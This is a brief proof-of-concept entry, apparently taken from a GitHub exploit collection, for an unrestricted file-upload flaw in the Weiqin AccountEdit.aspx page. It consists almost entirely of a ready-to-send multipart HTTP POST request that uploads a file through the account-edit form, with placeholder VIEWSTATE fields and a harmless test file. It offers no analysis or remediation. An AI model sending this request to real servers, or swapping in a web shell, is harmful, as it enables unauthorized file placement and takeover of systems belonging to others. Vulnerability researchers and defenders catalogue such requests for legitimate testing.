# weiqin_AccountEdit_fileupload

from: https://github.com/wy876/POC/blob/83ffd34e35da0bb8b1f8325dd4810e31b0d8a01a/%E5%BE%AE%E6%93%8E-AccountEdit-file-upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

2024.5.20 @2
```
POST /User/AccountEdit.aspx HTTP/1.1
Host:
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data;boundary=---------------------------8448979704593935221298734076

-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__VIEWSTATE"

{VIEWSTATE}
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__EVENTVALIDATION"

{EVENTVALIDATION}
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="111.txt"
Content-Type: text/plain

1233311
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"

上传图片
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"


-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"


-----------------------------8448979704593935221298734076--
```
